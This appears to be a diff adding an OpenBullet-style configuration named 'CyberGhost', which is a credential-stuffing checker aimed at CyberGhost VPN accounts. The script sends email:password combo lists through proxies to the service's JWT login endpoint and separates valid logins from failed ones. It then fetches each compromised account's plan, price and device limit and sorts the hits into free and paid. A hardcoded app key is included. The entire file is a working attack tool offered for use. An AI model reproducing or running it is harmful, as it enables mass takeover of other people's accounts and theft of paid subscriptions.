@@ -1,0 +1,70 @@
+[SETTINGS]
+{
+  "Name": "CyberGhost",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-03T21:14:38.277622+02:00",
+  "AdditionalInfo": "",
+  "Author": "Fakeboy",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://v2-api.cyberghostvpn.com/v2/my/account/jwt?language=en" AutoRedirect=FALSE 
+  CONTENT "{\"machineName\":\"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\",\"userName\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Host: v2-api.cyberghostvpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://account.cyberghostvpn.com" 
+  HEADER "X-APP-KEY: syvqtqgYXwfMPCWc9FfoWrKV0AnGjtDDijohouih9" 
+  HEADER "DNT: 1" 
+  HEADER "Content-Type: application/json;charset=UTF-8" 
+  HEADER "Referer: https://account.cyberghostvpn.com/en_us/login" 
+  HEADER "Accept-Language: en-US,en;q=0.9,ar;q=0.8" 
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "\"jwt\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"login wrong\"" 
+    KEY "\"UNAUTHORIZED\"" 
+PARSE "<SOURCE>" LR "\"jwt\": \"" "\"" -> VAR "token" 
+REQUEST GET "https://v2-api.cyberghostvpn.com/v2/my/account?fields=(recoverToken,autoCreated,language,region,activeProduct.*,activeProduct.plan,deviceCount,privateIpsCount)&language=en" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Host: v2-api.cyberghostvpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://account.cyberghostvpn.com" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "X-APP-KEY: syvqtqgYXwfMPCWc9FfoWrKV0AnGjtDDijohouih9" 
+  HEADER "DNT: 1" 
+  HEADER "Referer: https://account.cyberghostvpn.com/en_us/login" 
+  HEADER "Accept-Language: en-US,en;q=0.9,ar;q=0.8" 
+#SUB PARSE "<SOURCE>" LR "\"planType\":" "," -> CAP "Sub" 
+#PLAN PARSE "<SOURCE>" LR "\"displayName\": \"" "," -> CAP "Plan" 
+#PRICE PARSE "<SOURCE>" LR "\"USD\": " "," -> CAP "Price" 
+#MAX_DEVICES PARSE "<SOURCE>" LR "\"maxDevices\":" "," -> CAP "Maxdevices" 
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"planType\": \"free\"," 
+  KEYCHAIN Success OR 
+    KEY "\"planType\": \"paid\"," 
